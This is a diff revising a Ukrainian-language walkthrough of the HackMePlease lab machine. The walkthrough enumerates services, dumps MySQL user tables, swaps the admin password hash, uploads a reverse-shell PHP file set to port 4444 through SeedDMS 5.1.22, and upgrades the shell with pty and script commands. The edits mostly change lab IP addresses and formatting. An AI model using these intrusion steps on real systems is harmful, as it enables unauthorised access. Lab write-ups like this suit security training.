@@ -13,7 +13,6 @@
 4. Дослідити **MySql** сервіс.
 5. Отримати віддалений доступ.
 6. Зробити підвищення привілеїв.
-   
 
 ---
 
@@ -34,7 +33,6 @@ nmap -sC -sV -p- 192.168.56.107 --reason
 
 Таким чином, в нас є інформація для подальшого дослідження вебвервісу та сервісу БД.
 
-
 ### 3. Дослідження вебсервера
 
 У браузері відкриваємо http://192.168.56.107,  отримуємо:
@@ -47,7 +45,7 @@ nmap -sC -sV -p- 192.168.56.107 --reason
 
 **Детальний розбір команди**
 ```sh
-gobuster dir -u http://10.0.2.17 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,zip
+gobuster dir -u http://192.168.56.107 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,zip
 ```
 
 За декілька хвилин отримуємо наступний результат:
@@ -179,6 +177,7 @@ SHOW DATABASES;
 ```sql
 SHOW TABLES;
 ```
+
 ![tables](/AC-HackMePlease/src/SHOW_TABLES.png)
 
 ```sql
@@ -214,7 +213,7 @@ SELECT * FROM users;
 
 ---
 
-### 📋 Аналіз таблиці tblUsers
+### 📋 Аналіз таблиці t blUsers
 
 ```sql
 SELECT * FROM tblUsers;
@@ -237,7 +236,12 @@ f9ef2c539bad8a6d2f3432b6d49ab51a
 ### Заміна пароля адміністратора
 
 Наприклад, MD5-хеш для слова `12345Qwerty`:
+
+```sh
+echo -n '12345Qwerty' | md5sum
 ```
+
+```text
 a76beaa42a7c65d1b3d49cb4757e6b91
 ```
 ![md5](/AC-HackMePlease/src/createmd5hash.png)
@@ -282,7 +286,7 @@ $port = 4444;       // CHANGE THIS
 
 4. Після завантаження, навівши курсор на файл, у нижньому лівому куті браузера видно шлях до файлу.
    З цього посилання визначається **ID документа** (у нашому випадку  `5`).
-   **http://10.0.2.17/seeddms51x/seeddms-5.1.22/out/out.ViewDocument.php?documentid=5&showtree=1**
+   **http://192.168.56.108/seeddms51x/seeddms-5.1.22/out/out.ViewDocument.php?documentid=5&showtree=1**
 
 ![added](/AC-HackMePlease/src/downloadedlist.png)
 
@@ -313,13 +317,15 @@ data/{contentOffsetDir}/{ID_документа}/{ID_версії}.{розшир�
 ```sh
 python -c "import pty; pty.spawn('/bin/bash')"
 ```
-Немає пайтона :-), користуємось тим, що є:
+Якщо немає пайтона, користуємось тим, що є:
+
 ```sh
 script -qc /bin/bash /dev/null
 ```
+
 ---
 
-## ⬆️ Підвищення привілеїв
+## Підвищення привілеїв
 
 Перевірка домашніх каталогів:
 
